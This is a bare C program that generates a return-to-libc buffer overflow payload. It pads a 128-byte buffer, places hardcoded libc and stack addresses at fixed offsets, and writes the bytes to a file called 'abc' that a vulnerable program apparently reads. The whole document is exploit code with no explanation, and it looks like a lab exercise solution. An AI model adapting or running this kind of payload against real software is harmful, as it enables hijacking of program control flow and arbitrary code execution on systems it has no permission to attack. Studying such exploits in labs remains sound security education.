#include <stdio.h>
#include <string.h>

int main() {
  int i;

  char buf[128];
  FILE *fp;

  memset(buf, 'a', 128);
  *((unsigned*)(&buf[92])) = 0xf7e39c60;
  *((unsigned*)(&buf[96])) = 0xf7e19060;
  *((unsigned*)(&buf[100])) = 0xffffd508;
  *((unsigned*)(&buf[104])) = 0xffffd593;
  strncpy(buf+108, "%s\n", 4);

  fp = fopen("abc", "w");
  fwrite(buf, 1, 128, fp);

  fclose(fp);
}
